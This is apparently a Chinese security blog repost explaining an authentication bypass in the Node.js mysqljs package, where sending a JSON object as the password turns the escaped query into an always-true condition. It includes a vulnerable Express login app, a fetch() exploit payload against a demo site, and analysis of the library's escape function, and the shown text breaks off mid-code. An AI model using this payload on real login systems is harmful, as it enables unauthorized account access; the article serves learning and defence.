---
title: Mysqljs的一个小trick
url: https://mp.weixin.qq.com/s/iLA6aKabJvFeP8K46es_1Q
source: Doonsec's feed
date: 2026-02-16
fetch_date: 2026-02-17T04:14:17.099444
---

# Mysqljs的一个小trick

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vOORdxuIJbx8DJxBm78Ruia6g9iasqDpj8wGcf989t4a3Cduj8icqp5F6OOqhfGenuw3f61cX8ficSGeAJFYWc0Psiba0NNPdjXC0RiaNaRxTSf8s/0?wx_fmt=jpeg)

# Mysqljs的一个小trick

原创

梦洛
梦洛

泷羽Sec-track

![]()

在小说阅读器中沉浸阅读

> 声明！本文章所有的工具分享仅仅只是供大家学习交流为主，切勿用于非法用途，如有任何触犯法律的行为，均与本人及团队无关！！！

**往期推荐：**

**[【工具】一款图形化Jenkins综合漏洞利用工具](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489848&idx=1&sn=ddb36bc4b571856dfbd2491d8804e7f1&scene=21#wechat_redirect)**

**[【工具】自动化提取webpack打包前端接口](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489826&idx=1&sn=a080afcae6b04a608e1319ad3a82b3ad&scene=21#wechat_redirect)**

**[【工具】Heapdump图形化解密工具](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489757&idx=1&sn=c2cf8a9062c6524b6cd83e4ccd3888f5&scene=21#wechat_redirect)**

**[【工具】Burp自动化SSRF检测插件](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489734&idx=1&sn=74d2794df8fab7fc0cc839c18b00e955&scene=21#wechat_redirect)**

**[【工具】VueCrack-一键检测Vue站点未授权漏洞](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489723&idx=1&sn=a7470a5198e7da10c015f16593969f02&scene=21#wechat_redirect)**

**公众号：**

文章转载至

```
https://forum.butian.net/share/3853
```

> 这个知识点在blackhat mea ctf2024中出现了，所以就拿出来学习了，没想到在mysql中还有这种打法

# 前言

这个知识点在blackhat mea ctf2024中出现了，所以就拿出来学习了，没想到在mysql中还有这种打法。

# 0xff 简要

首先是在nodejs生态中比较重要的一个包mysqljs/mysql中发现了一种利用转义函数来进行sql注入的一个点。

通常来说，一些常规的防御函数都会被使用在一些场景来进行过滤操作，但是在mysqljs中因为其一些特性使得它可以进行绕过一些常见的过滤函数从而进行sql注入，这里的话主要讨论在sql注入中的万能密码。

并且这类的注入比较不常规，所以在一般sql注入的字典中是见不到这些playload的。 诸如:connect.escape()、mysql.escape()和pool.esacape()这类的函数也会被影响。

## demo1

这里是一个简单的实例

```
app.post("/auth", function(request, respond){
var username = request.body.username;
var password = request.body.password;
if(username && password){
    connection.query(
    "SELECT * FROM accounts WHERE username = ? AND password = ?",
    [username,password],
    function(error,result, field){
    ......
    }
    );

});
}
```

在大多数人的第一眼中，这个看起来是很安全的，但是因为`express`这个包的特性，所以我们可以利用这个来把username和passowrd的值给他改为其他数据类型例如obj boolean Array

接下来就是exp，这里的话直接fetch

```
data = {
    username : "admin",
    password:{
        password: 1,
    },
};
fetch("https://sqli.blog-demo.flatt.training/auth",{
    headers:{
    "content-type": "application/json",
    },
    body: JSON.stringify(data),
    method: "POST",
    mode: "cors",
    credentials: "include",

})
.then((r) => r.text())
.then((r) => {
    console.log(r);
});
```

这里其实应该就就能看见我们是把password的值改为了password的对象。

# 利用

这里的话我们利用https://github.com/stypr/vulnerable-nodejs-express-mysql 这个来进行演示。

首先进来是一个登录页面

![Pasted image 20241017191344.png](https://mmbiz.qpic.cn/sz_mmbiz_png/vOORdxuIJbw0k6hOVDWzofPObbGibzzYMCQN3VnzcsPUL3UtXicLog1yGb0naaxzZT4X3Fp3FspicH4GZ9GMvibskHrnGrgb7MaN7j5DibtWbAibc/640?wx_fmt=png&from=appmsg)

Pasted image 20241017191344.png

然后这里是他的一些路由

```
/*

    Reference: https://codeshack.io/basic-login-system-nodejs-express-mysql/

*/

var mysql = require("mysql");
var express = require("express");
var session = require("express-session");
var bodyParser = require("body-parser");
var path = require("path");

var connection = mysql.createConnection({
  host: "db",
  user: "login",
  password: "login",
  database: "login",
});

var app = express();
app.use(
  session({
    secret: require("crypto").randomBytes(64).toString("hex"),
    resave: true,
    saveUninitialized: true,
  })
);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", function (request, response) {
  response.sendFile(path.join(__dirname + "/login.html"));
});

app.post("/auth", function (request, response) {
  var username = request.body.username;
  var password = request.body.password;
  if (username && password) {
    connection.query(
      "SELECT * FROM accounts WHERE username = ? AND password = ?",
      [username, password],
      function (error, results, fields) {
        if (results.length > 0) {
          request.session.loggedin = true;
          request.session.username = username;
          response.redirect("/home");
        } else {
          response.send("Incorrect Username and/or Password!");
        }
        response.end();
      }
    );
  } else {
    response.send("Please enter Username and Password!");
    response.end();
  }
});

app.get("/home", function (request, response) {
  if (request.session.loggedin) {
    response.send("Welcome back, " + request.session.username + "!");
  } else {
    response.send("Please login to view this page!");
  }
  response.end();
});

app.listen(3000);
```

我们这里可以看到这里有三个路由

* /
* auth
* home 并且在auth处是做了鉴权操作的，然后在home的地方就可以返回当前用户的用户名

![Pasted image 20241017191630.png](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbyPXKGb9et4Nibr6dZQBz1LibthvicK1G8xv3p3ldBMXe3gUZUW7hAk0B57ib3CcvGBIfqAovfiabopIrYRN72e4CIdqcD9iaJNQSPmw/640?wx_fmt=png&from=appmsg)我们可以看到这里的admin账号是不知道他的密码的。 这里的话我们进行登录抓包

![Pasted image 20241017191754.png](https://mmbiz.qpic.cn/sz_mmbiz_png/vOORdxuIJbwZSImjomtc06ozffLfSQm7ybUY7F1o5heYibXVUH8tpl9ibjbwSZFCtpem2iaoWskQuDLtJRSomWa5OzMOgSPIeXqLW2fTBFstEc/640?wx_fmt=png&from=appmsg)可以看到这里的密码是错误的，然后我们再把它更改为一个对象，即password他本身

![Pasted image 20241017191842.png](https://mmbiz.qpic.cn/sz_mmbiz_png/vOORdxuIJbwTIXxoQnWWsl4X6envpOPM4B9W6HNjzjOjlWJZc6IHltVYAd0mzFy9j53UibaudrZ5Mny2vB8mGAlBzmicMuXOs8ZOqvHHbMGTc/640?wx_fmt=png&from=appmsg)可以看到这里做了一个重定向，而且刚好是路由中的登录页面，也就是说我们成功进行了登录，这里的话我们再抓一次包来看看跳转之后的页面

![Pasted image 20241017191949.png](https://mmbiz.qpic.cn/sz_mmbiz_png/vOORdxuIJbwaGibiaic98kLaAf49cojqyictQCSicOx9pEWM8DxicrCGbpkhSEhwA03sEqtyD6LShPATYZQv4obzr4Ax4IB51GQQ6ZRic6F97tOBAQ/640?wx_fmt=png&from=appmsg)可以看到我们这里是登录成功了。 同样的，我们也可以在google或者firefox中进行一个fetch然后在console处进行一个操作

# 原因分析

首先我们来看一下官方的doc https://github.com/mysqljs/mysql/blob/master/Readme.md#escaping-query-values 文档中指出了一般来说为了阻止sql注入会利用：

* `mysql.escape()`, `connection.escape()` or `pool.escape()`的方法

```
var userId = 'some user provided value';
var sql    = 'SELECT * FROM users WHERE id = ' + connection.escape(userId);
connection.query(sql, function (error, results, fields) {
  if (error) throw error;
  // ...
});
```

* 利用`?`作为placeholder并且可以放置多个placeholder来进行抵御攻击。

```
connection.query('SELECT * FROM users WHERE id = ?', [userId], function (error, results, fields) {
  if (error) throw error;
  // ...
});
```

等等，并且说明了不同类型的值会影响escaped，这里的话贴一下

* Numbers are left untouched
* Booleans are converted to `true` / `false`
* Date objects are converted to `'YYYY-mm-dd HH:ii:ss'` strings
* Buffers are converted to hex strings, e.g. `X'0fa5'`
* Strings are safely escaped
* Arrays are turned into list, e.g. `['a', 'b']` turns into `'a', 'b'`
* Nested arrays are turned into grouped lists (for bulk inserts), e.g. `[['a', 'b'], ['c', 'd']]` turns into `('a', 'b'), ('c', 'd')`
* Objects that have a `toSqlString` method will have `.toSqlString()` called and the returned value is used as the raw SQL.
* Objects are turned into `key = 'val'` pairs for each enumerable property on the object. If the property's value is a function, it is skipped; if the property's value is an object, toString() is called on it and the returned value is used.
* `undefined` / `null` are converted to `NULL`
* `NaN` / `Infinity` are left as-is. MySQL does not support these, and trying to insert them as values will trigger MySQL errors until they implement support.

所以我们先来看看`escape`函数他是如何处理的 https://github.com/mysqljs/sqlstring

```
SqlString.escape = function escape(val, stringifyObjects, timeZone) {
  if (val === undefined || val === null) {
    return 'NULL';
  }
  switch (typeof val) {
    case 'boolean': return (val) ? 'true' : 'false';
    case 'number': return val + '';
    case 'object':
      if (val instanceof Date) {
        return SqlString.dateToString(val, timeZone || 'local');
      } else if (Array.isArray(val)) {
        return SqlString.arrayToList(val, timeZone);
      } else if (Buffer.isBuffer(val)) {
        return SqlString.bufferToString(val);
      } else if (typeof val.toSqlString === 'function')...